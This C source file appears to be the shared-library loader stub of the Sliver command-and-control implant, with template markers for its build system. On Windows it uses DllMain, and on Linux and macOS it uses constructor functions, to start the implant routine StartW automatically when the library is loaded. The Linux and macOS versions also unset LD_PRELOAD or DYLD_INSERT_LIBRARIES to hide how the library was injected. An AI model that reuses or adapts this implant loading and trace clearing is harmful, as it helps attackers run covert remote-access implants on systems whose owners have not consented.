#include "sliver.h"

#ifdef __WIN32

DWORD WINAPI Start()
{
    StartW();
    return 0;
}

BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL, // handle to DLL module
    DWORD _fdwReason,    // reason for calling function
    LPVOID _lpReserved)  // reserved
{
    switch (_fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
    {
        // {{if .Config.IsSharedLib}}
        HANDLE hThread = CreateThread(NULL, 0, Start, NULL, 0, NULL);
        // CreateThread() because otherwise DllMain() is highly likely to deadlock.
        // {{end}}
    }
    break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;
    }
    return TRUE; // Successful.
}
#elif __linux__
#include <stdlib.h>

void StartW();

static void init(int argc, char **argv, char **envp)
{
    unsetenv("LD_PRELOAD");
    unsetenv("LD_PARAMS");
    StartW();
}
__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
#elif __APPLE__
#include <stdlib.h>
void StartW();

__attribute__((constructor)) static void init(int argc, char **argv, char **envp)
{
    unsetenv("DYLD_INSERT_LIBRARIES");
    unsetenv("LD_PARAMS");
    StartW();
}

#endif
